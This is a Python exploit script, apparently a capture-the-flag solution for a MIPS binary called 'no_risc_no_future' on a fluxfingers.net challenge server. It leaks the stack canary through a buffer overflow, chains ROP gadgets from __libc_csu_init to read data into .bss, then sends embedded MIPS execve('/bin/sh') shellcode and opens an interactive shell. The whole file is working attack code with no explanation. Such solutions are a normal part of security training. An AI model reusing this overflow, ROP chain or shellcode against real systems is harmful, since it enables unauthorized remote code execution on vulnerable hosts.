from ptrlib import *

elf = ELF("./no_risc_no_future")
sock = Socket("noriscnofuture.forfuture.fluxfingers.net", 1338)

got_read = 0x00490394
got_puts = 0x00490398
rop_popper = 0x400f24
rop_csu_init = 0x400f04
shellcode  = b"bi\t<//)5\xf4\xff\xa9\xafsh\t<n/)5\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd'  \xa0\x03\xfc\xff\xa0\xaf\xfc\xff\xbd'\xff\xff\x06(\xfc\xff\xa6\xaf\xfc\xff\xbd# 0\xa0\x03sh\t4\xfc\xff\xa9\xaf\xfc\xff\xbd'\xff\xff\x05(\xfc\xff\xa5\xaf\xfc\xff\xbd#\xfb\xff\x19$'( \x03 (\xbd\x00\xfc\xff\xa5\xaf\xfc\xff\xbd# (\xa0\x03\xab\x0f\x024\x0c\x01\x01\x01"

print(disasm(shellcode, arch="mips", endian='little', returns=str))

# leak canary
sock.send("A" * 0x41)
canary = b'\x00' + sock.recvline()[-3:]
logger.info(b"canary = " + canary)

# rop
for i in range(8):
    sock.send("A" * 0x41)
    sock.recvline()
payload = b'A' * 0x40
payload += canary
payload += p32(0xdeadbeef)
payload += p32(rop_popper)
payload += flat([
    b'A' * 0x1c,
    p32(got_read),                    # s0
    p32(0),                           # s1
    p32(0),                           # s2 = a0
    p32(elf.section(".bss") + 0x100), # s3 = a1
    p32(0x200),                       # s4 = a2
    p32(1),                           # s5
    p32(rop_csu_init),                # ra
])
payload += b'A' * 0x34
payload += p32(elf.section(".bss") + 0x100)
assert len(payload) < 0x100
sock.send(payload)
sock.recvline()

import time
time.sleep(1)
sock.send(shellcode)

sock.interactive()
